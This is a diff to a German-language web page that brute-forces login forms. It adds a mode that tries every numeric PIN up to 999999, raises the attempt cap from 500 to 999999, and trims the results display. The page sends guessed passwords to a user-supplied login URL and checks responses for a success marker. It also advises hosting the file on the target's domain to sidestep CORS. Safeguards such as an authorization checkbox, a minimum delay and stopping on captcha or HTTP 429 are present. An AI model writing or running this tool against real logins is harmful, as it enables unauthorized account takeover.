@@ -79,12 +79,38 @@
   </fieldset>
 
   <fieldset>
+    <legend>Betriebsart</legend>
+    <label><input type="radio" name="attack_mode" value="wordlist" checked> Wortliste (selbst eingetragen)</label>
+    <label><input type="radio" name="attack_mode" value="pin"> Zahlen-PIN (Bereich automatisch generiert)</label>
+  </fieldset>
+
+  <fieldset id="wordlist-fields">
     <legend>Passwortliste</legend>
     <label for="wordlist">Ein Passwort pro Zeile</label>
     <textarea id="wordlist" placeholder="123456&#10;passwort&#10;qwertz123"></textarea>
+  </fieldset>
 
+  <fieldset id="pin-fields" style="display:none;">
+    <legend>PIN-Bereich</legend>
+    <label for="pin_from">Von</label>
+    <input type="number" id="pin_from" min="0" max="999999" value="1">
+    <label for="pin_to">Bis</label>
+    <input type="number" id="pin_to" min="0" max="999999" value="999999">
+    <div class="hint">Probiert automatisch jede Zahl in diesem Bereich (max. 999999) als Passwort.</div>
+
+    <div class="checkbox-row">
+      <input type="checkbox" id="pin_pad">
+      <label for="pin_pad">Mit f&uuml;hrenden Nullen auff&uuml;llen (z.B. 0001 statt 1) &ndash; n&ouml;tig, wenn das Feld eine feste L&auml;nge erwartet</label>
+    </div>
+    <label for="pin_pad_len">PIN-L&auml;nge f&uuml;r Nullen-Auff&uuml;llung</label>
+    <input type="number" id="pin_pad_len" min="4" max="6" value="6">
+  </fieldset>
+
+  <fieldset>
+    <legend>Tempo</legend>
     <label for="delay">Verz&ouml;gerung zwischen Versuchen (Sek., min. 0.5)</label>
     <input type="number" id="delay" step="0.1" min="0.5" value="1">
+    <div class="hint">Bei einem vollen 6-stelligen Bereich (999999 Versuche) dauert der Test bei 0,5s Verz&ouml;gerung mehrere Tage &ndash; das ist beabsichtigt (kein DoS-Tool). Grenze den Bereich ein, wenn du gezielt testen willst.</div>
   </fieldset>
 
   <div class="checkbox-row">
@@ -101,19 +127,30 @@
 <div id="results"></div>
 
 <script>
-const MAX_ATTEMPTS = 500;
+const MAX_ATTEMPTS = 999999;
 const MIN_DELAY = 0.5;
+const RESULT_ROWS_SHOWN = 25;
 
 const form = document.getElementById('bf-form');
 const errorEl = document.getElementById('error');
 const resultsEl = document.getElementById('results');
 const startBtn = document.getElementById('start-btn');
 const stopBtn = document.getElementById('stop-btn');
+const wordlistFields = document.getElementById('wordlist-fields');
+const pinFields = document.getElementById('pin-fields');
 
 let running = false;
 let stopRequested = false;
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+document.querySelectorAll('input[name=attack_mode]').forEach(radio => {
+  radio.addEventListener('change', () => {
+    const isPin = document.querySelector('input[name=attack_mode]:checked').value === 'pin';
+    wordlistFields.style.display = isPin ? 'none' : 'block';
+    pinFields.style.display = isPin ? 'block' : 'none';
+  });
+});
 
 function showError(msg) {
   errorEl.textContent = msg;
@@ -145,14 +182,37 @@ form.addEventListener('submit', async (e) => {
   let delay = parseFloat(document.getElementById('delay').value);
   if (isNaN(delay) || delay < MIN_DELAY) delay = MIN_DELAY;
 
-  const passwords = document.getElementById('wordlist').value
-    .split('\n').map(p => p.trim()).filter(p => p.length > 0).slice(0, MAX_ATTEMPTS);
+  const attackMode = document.querySelector('input[name=attack_mode]:checked').value;
+
+  let totalCount, getPassword;
+
+  if (attackMode === 'pin') {
+    let from = parseInt(document.getElementById('pin_from').value, 10);
+    let to = parseInt(document.getElementById('pin_to').value, 10);
+    const pad = document.getElementById('pin_pad').checked;
+    const padLen = parseInt(document.getElementById('pin_pad_len').value, 10) || 6;
+
+    if (isNaN(from) || isNaN(to) || from < 0 || to > 999999 || from > to) {
+      showError('Bitte einen gültigen PIN-Bereich angeben (0–999999, Von ≤ Bis).');
+      return;
+    }
+    totalCount = Math.min(to - from + 1, MAX_ATTEMPTS);
+    getPassword = (idx) => {
+      const n = from + idx;
+      return pad ? String(n).padStart(padLen, '0') : String(n);
+    };
+  } else {
+    const passwords = document.getElementById('wordlist').value
+      .split('\n').map(p => p.trim()).filter(p => p.length > 0).slice(0, MAX_ATTEMPTS);
+    totalCount = passwords.length;
+    getPassword = (idx) => passwords[idx];
+  }
 
   if (!confirmed) { showError('Du musst bestätigen, dass du zum Testen berechtigt bist.'); return; }
   if (!loginUrl.startsWith('http://') && !loginUrl.startsWith('https://')) { showError('Bitte eine gültige Login-URL angeben.'); return; }
   if (!username) { showError('Bitte einen Benutzernamen angeben.'); return; }
   if (!indicatorText) { showError('Bitte einen Erkennungstext angeben.'); return; }
-  if (passwords.length === 0) { showError('Bitte mindestens ein Passwort in der Liste angeben.'); return; }
+  if (totalCount === 0) { showError('Es gibt nichts zum Ausprobieren (leere Liste bzw. leerer Bereich).'); return; }
 
   running = true;
   stopRequested = false;
@@ -165,13 +225,14 @@ form.addEventListener('submit', async (e) => {
 
   let foundPassword = null;
   let stoppedReason = null;
-  const attempts = [];
+  let triedCount = 0;
+  const recentAttempts = [];
 
-  for (let i = 0; i < passwords.length; i++) {
+  for (let i = 0; i < totalCount; i++) {
     if (stopRequested) { stoppedReason = 'Manuell abgebrochen.'; break; }
 
-    const pw = passwords[i];
-    progressEl.textContent = `Versuch ${i + 1}/${passwords.length}: ${pw}`;
+    const pw = getPassword(i);
+    progressEl.textContent = `Versuch ${i + 1}/${totalCount}: ${pw}`;
 
     const body = new URLSearchParams();
     body.set(usernameField, username);
@@ -187,47 +248,51 @@ form.addEventListener('submit', async (e) => {
       netError = err.message;
     }
 
+    triedCount++;
+
     if (netError) {
       stoppedReason = `Netzwerk-/CORS-Fehler: ${netError}. Host diese Datei auf derselben Domain wie die Login-Seite, dann greift CORS nicht mehr.`;
-      attempts.push({ pw, status: '-', matched: false });
+      recentAttempts.push({ pw, status: '-', matched: false });
       break;
     }
 
     if (text.includes('captcha')) {
       stoppedReason = 'Captcha erkannt — Ziel schützt sich aktiv. Test abgebrochen (gutes Zeichen).';
-      attempts.push({ pw, status, matched: false });
+      recentAttempts.push({ pw, status, matched: false });
       break;
     }
     if (status === 429) {
       stoppedReason = 'HTTP 429 erhalten — Rate-Limiting ist aktiv. Test abgebrochen (gutes Zeichen).';
-      attempts.push({ pw, status, matched: false });
+      recentAttempts.push({ pw, status, matched: false });
       break;
     }
 
     matched = indicatorMode === 'success_text' ? text.includes(indicatorText) : !text.includes(indicatorText);
-    attempts.push({ pw, status, matched });
+    recentAttempts.push({ pw, status, matched });
+    if (recentAttempts.length > RESULT_ROWS_SHOWN) recentAttempts.shift();
 
     if (matched) { foundPassword = pw; break; }
 
     await sleep(delay * 1000);
   }
 
-  if (!foundPassword && !stoppedReason && attempts.length >= MAX_ATTEMPTS) {
+  if (!foundPassword && !stoppedReason && triedCount >= MAX_ATTEMPTS) {
     stoppedReason = `Maximale Versuchsanzahl (${MAX_ATTEMPTS}) erreicht.`;
   }
 
   let html = '<h2>Ergebnis</h2>';
   if (foundPassword) {
-    html += `<p class="found">Passwort gefunden: ${foundPassword} (nach ${attempts.length} Versuchen)</p>`;
+    html += `<p class="found">Passwort gefunden: ${foundPassword} (nach ${triedCount} Versuchen)</p>`;
   } else {
-    html += `<p>Kein Passwort aus der Liste hat funktioniert (${attempts.length} Versuche).</p>`;
+    html += `<p>Kein Passwort hat funktioniert (${triedCount} von ${totalCount} Versuchen).</p>`;
   }
   if (stoppedReason) {
     html += `<p class="stopped">Hinweis: ${stoppedReason}</p>`;
   }
-  html += '<table><tr><th>#</th><th>Passwort</th><th>Status</th><th>Treffer</th></tr>';
-  attempts.forEach((a, idx) => {
-    html += `<tr class="${a.matched ? 'match' : ''}"><td>${idx + 1}</td><td>${a.pw}</td><td>${a.status}</td><td>${a.matched ? 'Ja' : 'Nein'}</td></tr>`;
+  html += `<p class="hint">Zeige die letzten ${recentAttempts.length} Versuche:</p>`;
+  html += '<table><tr><th>Passwort</th><th>Status</th><th>Treffer</th></tr>';
+  recentAttempts.forEach((a) => {
+    html += `<tr class="${a.matched ? 'match' : ''}"><td>${a.pw}</td><td>${a.status}</td><td>${a.matched ? 'Ja' : 'Nein'}</td></tr>`;
   });
   html += '</table>';
 
